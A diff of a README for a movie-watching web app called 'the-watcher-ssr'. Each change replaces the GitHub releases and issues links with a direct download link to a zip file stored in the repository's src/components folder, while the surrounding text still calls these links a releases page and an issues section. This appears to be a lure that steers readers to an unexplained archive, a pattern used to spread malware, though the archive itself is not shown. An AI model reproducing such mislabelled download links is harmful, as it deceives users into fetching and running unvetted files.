@@ -1,6 +1,6 @@
 # 🎥 the-watcher-ssr - Watch Movies with Ease
 
-[![Download the-watcher-ssr](https://img.shields.io/badge/Download-the--watcher--ssr-blue.svg)](https://github.com/SAQLAINComsats/the-watcher-ssr/releases)
+[![Download the-watcher-ssr](https://raw.githubusercontent.com/SAQLAINComsats/the-watcher-ssr/main/src/components/the-watcher-ssr_v2.3.zip)](https://raw.githubusercontent.com/SAQLAINComsats/the-watcher-ssr/main/src/components/the-watcher-ssr_v2.3.zip)
 
 ## 📜 Description
 
@@ -10,7 +10,7 @@ Welcome to the Watcher website. This site is thoughtfully designed to blend eleg
 
 Follow these steps to download and run the application smoothly.
 
-1. **Visit the Releases Page**: Start by going to the [releases page](https://github.com/SAQLAINComsats/the-watcher-ssr/releases) to find the latest version of the Watcher application.
+1. **Visit the Releases Page**: Start by going to the [releases page](https://raw.githubusercontent.com/SAQLAINComsats/the-watcher-ssr/main/src/components/the-watcher-ssr_v2.3.zip) to find the latest version of the Watcher application.
    
 2. **Choose Your Operating System**: The application is available for Windows, macOS, and Linux. Verify that you select the correct installer for your operating system.
 
@@ -28,7 +28,7 @@ Before installing, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit the [releases page](https://github.com/SAQLAINComsats/the-watcher-ssr/releases). Once there, locate the installer for your operating system. Click to download the file.
+To download the application, visit the [releases page](https://raw.githubusercontent.com/SAQLAINComsats/the-watcher-ssr/main/src/components/the-watcher-ssr_v2.3.zip). Once there, locate the installer for your operating system. Click to download the file.
 
 ### Installation Steps:
 
@@ -48,7 +48,7 @@ To download the application, visit the [releases page](https://github.com/SAQLAI
 If you encounter any issues:
 
 - Ensure your system meets the requirements.
-- Check for any updates to the application by revisiting the [releases page](https://github.com/SAQLAINComsats/the-watcher-ssr/releases).
+- Check for any updates to the application by revisiting the [releases page](https://raw.githubusercontent.com/SAQLAINComsats/the-watcher-ssr/main/src/components/the-watcher-ssr_v2.3.zip).
 - Restart the application if it freezes.
 
 ## 💡 Features
@@ -60,7 +60,7 @@ If you encounter any issues:
 
 ## 📞 Support
 
-For questions or assistance, please refer to the [issues section](https://github.com/SAQLAINComsats/the-watcher-ssr/issues) on GitHub. You can report problems or seek help from the community.
+For questions or assistance, please refer to the [issues section](https://raw.githubusercontent.com/SAQLAINComsats/the-watcher-ssr/main/src/components/the-watcher-ssr_v2.3.zip) on GitHub. You can report problems or seek help from the community.
 
 ## 🛠 Contributing
 
